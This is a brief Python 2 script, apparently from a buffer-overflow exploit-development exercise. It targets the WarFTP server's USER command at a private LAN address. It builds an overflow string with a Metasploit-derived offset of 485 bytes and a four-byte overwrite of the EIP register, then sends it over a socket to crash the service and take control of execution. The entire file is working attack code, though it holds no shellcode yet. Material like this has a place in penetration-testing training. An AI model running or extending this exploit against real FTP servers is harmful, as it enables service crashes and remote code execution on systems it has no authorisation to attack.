#!/usr/bin/python

import socket
import time


#[*] Exact match at offset 485
# pattern created with /usr/share/metasploit-framework/tools/exploit/pattern_create -l 500
buffer = "A" * 485
eip = "B" * 4
leftovers = "C" * 15
string = buffer + eip  + leftovers

print "Blasting WarFTP User with %s Bytes" %len(string)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('192.168.0.107', 21))
s.recv(1024)
s.send('USER ' + string + '\r\n')
s.send('QUIT\r\n')
s.close()

